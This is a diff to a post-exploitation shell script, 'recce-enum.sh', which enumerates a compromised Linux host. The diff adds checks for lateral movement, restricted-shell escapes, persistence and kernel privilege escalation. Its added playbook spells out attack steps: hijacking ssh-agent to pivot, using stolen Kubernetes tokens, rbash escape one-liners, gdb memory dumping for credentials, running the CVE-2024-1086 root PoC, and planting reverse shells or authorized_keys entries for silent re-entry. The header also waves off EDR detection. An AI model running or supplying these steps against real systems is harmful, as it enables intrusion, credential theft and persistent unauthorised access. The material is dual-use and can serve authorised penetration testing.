@@ -2,7 +2,8 @@
 # recce-enum.sh - thorough, READ-ONLY local enumeration for Linux/Unix.
 #
 # The on-target companion to recce: run this once you have a shell on a host to
-# surface privilege-escalation vectors and sensitive exposure (a linPEAS-style
+# surface privilege-escalation vectors, lateral-movement / pivot leads, restricted-
+# shell escapes and persistence footholds, plus sensitive exposure (a linPEAS-style
 # sweep). It changes NOTHING - only reads system state with built-in tools - so
 # it is safe to run and does not behave like malware. There is no exploit code,
 # no download, no obfuscation. If an EDR flags a plain read-only script,
@@ -84,8 +85,10 @@ if [ "$SELFTEST" -eq 1 ]; then
   chk_all "Processes"           ps
   chk_any "Network sockets"     ss netstat
   chk_any "Network config"      ip ifconfig
+  chk_any "Lateral movement"    ssh kubectl getent
   chk_any "Software inventory"  dpkg rpm
   chk_all "Core (always used)"  find grep sed awk
+  echo "[info] also: restricted-shell, persistence-hook and lateral-movement sections always run (built-ins)"
   echo
   echo "Self-test complete. If the parse is OK, a real run is safe:  ./recce-enum.sh"
   exit 0
@@ -122,6 +125,24 @@ fi
 if [ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 8 ] && [ "$kmin" -le 16 ]; then
   find_ "Kernel $KREL is in the Dirty Pipe (CVE-2022-0847) range (5.8-5.16.11) - verify patch level"; flag DIRTYPIPE "$KREL"
 fi
+# nf_tables UAF (CVE-2024-1086): kernels ~5.14 through 6.6; needs unprivileged
+# user namespaces (public LPE PoC). Range check kept deliberately broad.
+nft=0
+[ "$kmaj" = "5" ] && [ -n "$kmin" ] && [ "$kmin" -ge 14 ] && nft=1
+[ "$kmaj" = "6" ] && [ -n "$kmin" ] && [ "$kmin" -le 6 ] && nft=1
+if [ "$nft" = "1" ]; then find_ "Kernel $KREL is in the nf_tables CVE-2024-1086 range (5.14-6.6) - public LPE PoC (needs unprivileged user namespaces)"; flag NFTABLES "$KREL"; fi
+# Unprivileged user namespaces = precondition for many recent LPEs.
+if [ -r /proc/sys/kernel/unprivileged_userns_clone ]; then
+  info "unprivileged_userns_clone: $(cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null)"
+fi
+# ptrace_scope=0 lets you attach to other users' processes (dump creds / inject).
+if [ -r /proc/sys/kernel/yama/ptrace_scope ]; then
+  PTS=$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)
+  info "ptrace_scope: $PTS"
+  [ "$PTS" = "0" ] && { find_ "ptrace_scope=0 -> attach to other users' processes (dump memory/creds, inject a shell)"; flag PTRACE_SCOPE "0"; }
+fi
+# LSM enforcement (affects which container/SUID escapes work).
+info "LSM: $( getenforce 2>/dev/null || { aa-status --enabled 2>/dev/null && echo 'AppArmor enabled'; } || echo 'none detected')"
 # OverlayFS / GameOver(lay) (CVE-2021-3493, CVE-2023-2640/32629): Ubuntu-specific.
 if [ "$DISTRO" = "ubuntu" ]; then
   find_ "Ubuntu $DVER (kernel $KREL) - check OverlayFS LPE CVE-2021-3493 and GameOver(lay) CVE-2023-2640/2023-32629 (Ubuntu-only, public one-liners)"; flag OVERLAYFS "$DVER/$KREL"
@@ -344,6 +365,71 @@ info "listening sockets:"; { ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null
 info "routes:"; { ip route 2>/dev/null || route -n 2>/dev/null; } | sed 's/^/    /'
 cat_ /etc/hosts
 info "ARP neighbours:"; { ip neigh 2>/dev/null || arp -a 2>/dev/null; } | sed 's/^/    /' | head -20
+
+# ============================================================ lateral movement
+sec "Lateral movement & pivoting"
+# SSH trust graph: where THIS account can reach, and reusable onward auth.
+for f in "$HOME/.ssh/config" /etc/ssh/ssh_config; do
+  [ -r "$f" ] && { info "ssh client config: $f"; grep -iE '^[[:space:]]*(host|hostname|user|proxyjump|proxycommand|identityfile|controlpath)' "$f" 2>/dev/null | sed 's/^/      /' | head -30; }
+done
+for f in "$HOME/.ssh/known_hosts" /root/.ssh/known_hosts; do
+  [ -r "$f" ] && { n=$(grep -c . "$f" 2>/dev/null); info "known_hosts $f: ${n:-0} entr(ies) - hosts this account has reached"; }
+done
+# A live ssh-agent socket authenticates onward with keys you can't even read.
+if [ -n "$SSH_AUTH_SOCK" ] && [ -S "$SSH_AUTH_SOCK" ]; then
+  find_ "ssh-agent socket live ($SSH_AUTH_SOCK) -> hijack to SSH onward as $WHO (ssh-add -l lists the keys)"; flag SSH_AGENT "$SSH_AUTH_SOCK"
+fi
+ls -la /tmp/ssh-*/agent.* 2>/dev/null | sed 's/^/    /' | head -5
+# Kubernetes: an in-cluster service-account token authenticates to the API.
+if [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+  find_ "Kubernetes service-account token readable (/var/run/secrets/kubernetes.io) -> query the cluster API (kubectl --token=...)"; flag K8S_TOKEN "serviceaccount token"
+fi
+for f in "$HOME/.kube/config" /etc/kubernetes/admin.conf; do [ -r "$f" ] && { find_ "kubeconfig readable: $f -> cluster access + workload pivot"; flag KUBECONFIG "$f"; }; done
+# Config-management inventories/creds reach every managed node.
+for d in /etc/ansible /etc/salt /etc/puppet /etc/puppetlabs; do
+  [ -d "$d" ] && info "config-mgmt present: $d (inventory/creds -> push to managed nodes)"
+done
+[ -r /etc/ansible/hosts ] && { info "ansible inventory:"; grep -vE '^[[:space:]]*(#|$)' /etc/ansible/hosts 2>/dev/null | sed 's/^/      /' | head -20; }
+# Dual-homed? Extra interfaces = a route into another segment.
+nif=$( { ip -brief addr 2>/dev/null || ifconfig -a 2>/dev/null; } | grep -icE '^(eth|ens|enp|eno|wl|tun|tap)' )
+if [ "${nif:-0}" -gt 1 ] 2>/dev/null; then find_ "Multiple network interfaces ($nif) -> this host is a pivot into another segment"; flag DUAL_HOMED "$nif interfaces"; fi
+info "established connections (pivot leads):"; { ss -tnp state established 2>/dev/null || netstat -tnp 2>/dev/null | grep EST; } | sed 's/^/    /' | head -20
+# DB client creds that also work against remote DB hosts.
+for f in "$HOME/.pgpass" "$HOME/.my.cnf" "$HOME/.mylogin.cnf"; do [ -r "$f" ] && { find_ "DB client credential file: $f -> reuse against remote DB hosts"; flag DB_CREDS "$f"; }; done
+
+# ============================================================ restricted shell
+sec "Restricted shell & shell escape"
+CUR_SHELL=$(getent passwd "$WHO" 2>/dev/null | awk -F: '{print $7}')
+info "login shell: ${CUR_SHELL:-$SHELL}"
+case "${CUR_SHELL:-$SHELL}" in
+  *rbash|*rksh|*rzsh|*lshell|*rssh|*git-shell|*scponly)
+    find_ "Restricted shell (${CUR_SHELL:-$SHELL}) -> escape via an allowed interpreter (vi/less/awk/find/man) or a PATH/SHELL export; see the how-to"; flag RESTRICTED_SHELL "${CUR_SHELL:-$SHELL}";;
+esac
+case "$-" in *r*) find_ "Current shell has the restricted flag set (\$- = $-) -> rbash-style jail"; flag RESTRICTED_SHELL "rbash (\$-=$-)";; esac
+info "shells present (candidate escape interpreters): $(grep -vE '^[[:space:]]*#' /etc/shells 2>/dev/null | tr '\n' ' ')"
+
+# ============================================================ persistence footholds
+sec "Persistence footholds (writable login/boot hooks)"
+# Read-only DETECTION of auto-run hooks: a persistence surface, and if a
+# privileged user triggers one, an escalation path. Nothing is written.
+for f in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc" \
+         /etc/bash.bashrc /etc/profile /etc/zsh/zshrc /etc/environment; do
+  [ -w "$f" ] && { find_ "Writable login-time file: $f (runs at shell/login start)"; flag WRITABLE_RC "$f"; }
+done
+for d in /etc/profile.d /etc/update-motd.d; do
+  [ -d "$d" ] && while read -r w; do [ -n "$w" ] && { find_ "Writable login-time script: $w (root runs profile.d/update-motd at login)"; flag WRITABLE_RC "$w"; }; done < <(find "$d" -maxdepth 1 -type f -writable 2>/dev/null)
+done
+[ -w "$HOME/.ssh/authorized_keys" ] && { find_ "Writable ~/.ssh/authorized_keys -> add a key for silent re-entry as $WHO"; flag WRITABLE_AUTHKEYS "$HOME/.ssh/authorized_keys"; }
+for f in /etc/pam.d/common-auth /etc/pam.d/sshd /etc/pam.d/sudo; do
+  [ -w "$f" ] && { find_ "Writable PAM config: $f -> auth bypass / persistence"; flag PAM_WRITABLE "$f"; }
+done
+# Surface existing (possibly rogue) persistence.
+for f in "$HOME/.ssh/authorized_keys" /root/.ssh/authorized_keys; do
+  [ -r "$f" ] && { k=$(grep -c '.' "$f" 2>/dev/null); [ "${k:-0}" -gt 0 ] && info "authorized_keys $f: ${k} key(s) present"; }
+done
+have atq && { aq=$(atq 2>/dev/null); [ -n "$aq" ] && { info "at jobs queued:"; printf '%s\n' "$aq" | sed 's/^/    /'; }; }
+[ -d "$HOME/.config/systemd/user" ] && info "user systemd units: $(ls "$HOME/.config/systemd/user/" 2>/dev/null | tr '\n' ' ')"
+[ -d "$HOME/.config/autostart" ] && info "XDG autostart entries: $(ls "$HOME/.config/autostart" 2>/dev/null | tr '\n' ' ')"
 
 # ============================================================ software / misc
 sec "Installed software (versions -> match to CVEs offline)"
@@ -603,11 +689,66 @@ if pb_has REDIS; then step "Unauthenticated Redis -> write a key/cron/authorized
     "         then SET a key holding your public SSH key and  SAVE." \
     "confirm: ssh -i <key> root@<ip>   (needs redis writable as root; else target web-root/cron)"; fi
 
-if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV; then
+if pb_has SSH_AGENT; then step "Live ssh-agent -> pivot onward as this user"; list_ SSH_AGENT
+  step "  how" \
+    "prereq : SSH_AUTH_SOCK points at a live agent (keys are held in memory, not on disk)." \
+    "run    : SSH_AUTH_SOCK=<sock> ssh-add -l         # list the loaded identities" \
+    "         SSH_AUTH_SOCK=<sock> ssh <user>@<known-host>   # auth with the agent's key" \
+    "targets: pull hosts from ~/.ssh/known_hosts and ~/.ssh/config above." \
+    "confirm: a shell on another host without ever reading the private key"; fi
+
+if pb_has K8S_TOKEN || pb_has KUBECONFIG; then step "Kubernetes creds -> cluster + workload pivot"
+  [ -n "$(pb_vals K8S_TOKEN)" ]  && list_ K8S_TOKEN; [ -n "$(pb_vals KUBECONFIG)" ] && list_ KUBECONFIG
+  step "  how" \
+    "token  : T=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+    "         kubectl --token=\$T --server=https://<api>:6443 auth can-i --list" \
+    "config : KUBECONFIG=<file> kubectl get pods -A   (then exec/priv pods, read secrets)" \
+    "confirm: enumerate/exec across the cluster with the account's RBAC"; fi
+
+if pb_has RESTRICTED_SHELL; then step "Restricted shell -> break out"; list_ RESTRICTED_SHELL
+  step "  how (try in order, per GTFOBins for the allowed binaries)" \
+    "editor : vi/vim ->  :set shell=/bin/bash  then  :shell     (less ->  !/bin/bash)" \
+    "lang   : awk 'BEGIN{system(\"/bin/bash\")}'    find . -exec /bin/bash \\;    man->!/bin/bash" \
+    "env    : export PATH=/bin:/usr/bin  ;  export SHELL=/bin/bash  ;  ssh with -t bash" \
+    "confirm: an unrestricted prompt (type: echo \$-  -> no 'r')"; fi
+
+if pb_has DUAL_HOMED; then step "Dual-homed host -> pivot into another segment"; list_ DUAL_HOMED
+  step "  how" \
+    "map    : ip -brief addr / ip route  -> note the second subnet." \
+    "pivot  : ssh -D 1080 <this-host>  (SOCKS)  or  chisel/ligolo-ng  through this host," \
+    "         then scan/reach the far segment via the proxy (proxychains)." \
+    "confirm: you can reach hosts only routable from this box"; fi
+
+if pb_has PTRACE_SCOPE; then step "ptrace_scope=0 -> steal creds from another process"; list_ PTRACE_SCOPE
+  step "  how" \
+    "run    : gdb -p <pid-of-a-privileged-or-target-process>  and read memory, or" \
+    "         inject a shellcode/so via the standard ptrace technique (public PoCs)." \
+    "creds  : dump a target's memory to scrape passwords/tokens it holds." \
+    "confirm: recovered secret or code exec in the target's context"; fi
+
+if pb_has NFTABLES; then step "nf_tables (CVE-2024-1086) -> root"; list_ NFTABLES
+  step "  how" \
+    "prereq : unprivileged user namespaces enabled (unprivileged_userns_clone=1)." \
+    "run    : compile the public CVE-2024-1086 PoC offline; it UAFs nf_tables -> root." \
+    "confirm: id -> uid=0(root)   (test in a VM - kernel LPEs can panic)"; fi
+
+if pb_has WRITABLE_RC || pb_has WRITABLE_AUTHKEYS || pb_has PAM_WRITABLE; then
+  step "Writable login hook -> escalation when a privileged user logs in / persistence"
+  [ -n "$(pb_vals WRITABLE_RC)" ]       && list_ WRITABLE_RC
+  [ -n "$(pb_vals WRITABLE_AUTHKEYS)" ] && list_ WRITABLE_AUTHKEYS
+  [ -n "$(pb_vals PAM_WRITABLE)" ]      && list_ PAM_WRITABLE
+  step "  how" \
+    "rc     : if root (or an admin) sources the writable file at login, your line runs as them" \
+    "         (e.g. a reverse shell / cp+chmod +s bash). Confirm WHO triggers it first." \
+    "authkey: append your public key -> ssh back in as that user any time." \
+    "confirm: code exec as the triggering user / silent re-entry"; fi
+
+if pb_has SSH_KEY || pb_has KRB_TICKET || pb_has CLOUD_CREDS || pb_has SECRETS_FOUND || pb_has PROC_ENV || pb_has DB_CREDS; then
   step "Harvested credentials / keys / tickets -> reuse & pivot"
   [ -n "$(pb_vals SSH_KEY)" ]     && list_ SSH_KEY
   [ -n "$(pb_vals KRB_TICKET)" ]  && list_ KRB_TICKET
   [ -n "$(pb_vals CLOUD_CREDS)" ] && list_ CLOUD_CREDS
+  [ -n "$(pb_vals DB_CREDS)" ]    && list_ DB_CREDS
   step "  how" \
     "ssh    : ssh -i <id_rsa> <user>@<host>   (chmod 600 the key first)" \
     "kerb   : export KRB5CCNAME=<ccache>; klist; then impacket tools with -k -no-pass" \
